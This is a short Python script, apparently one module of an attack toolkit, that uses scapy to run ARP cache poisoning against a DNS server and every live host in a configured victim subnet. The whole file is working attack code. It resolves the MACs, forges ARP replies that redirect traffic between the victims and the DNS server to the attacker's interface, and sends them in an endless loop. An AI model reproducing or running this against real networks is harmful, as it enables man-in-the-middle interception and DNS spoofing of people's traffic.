import sys
import os
from scapy.all import *
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
import ipaddress

def arp():

	print("Starting ARP Bombing")

	# Get self ethernet address
	self_mac = get_if_hwaddr(str(ATTACK_STATUS['iface']))

	if not self_mac:
		return

	#retrieving MAC address from DNS server
	arp_resolver_package_dns = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ATTACK_STATUS["dns"])
	mac_dns = srp(arp_resolver_package_dns, timeout=2, verbose=False)

	if mac_dns[0]:
		mac_dns = mac_dns[0][0][1].hwsrc
	else:
		return

	# Parse subnet of victims
	victims = ipaddress.IPv4Network(ATTACK_STATUS['victims'], strict=False);

	# Initialize an empty array of packets
	packets = []

	# Iterate on each victim
	for victim in victims.hosts():

		# Get the victim MAC address
		arp_resolver_package_victim = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(victim))
		mac_victim = srp(arp_resolver_package_victim, timeout=2, verbose=False)
		
		# If mac addr is not found then consider that victim is offline, don't treat the victim
		# Else add spoofed packets (DNS --> Victim and Victim --> DNS)
		if mac_victim[0]:
			mac_victim = mac_victim[0][0][1].hwsrc

			#creation of ARP poisoning packets
			p1 = Ether(dst=mac_victim) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['dns'], hwdst="00:00:00:00:00:00", pdst=str(victim));
			p2 = Ether(dst=mac_dns) / ARP(op=1, hwsrc=self_mac, psrc=str(victim), hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['dns']);

			packets.append(p1)
			packets.append(p2)

	#poisonloop
	while True:

		for i in range(len(packets)):
			sendp(packets[i], iface=str(ATTACK_STATUS['iface']), verbose=False)
		time.sleep(1)

			

			
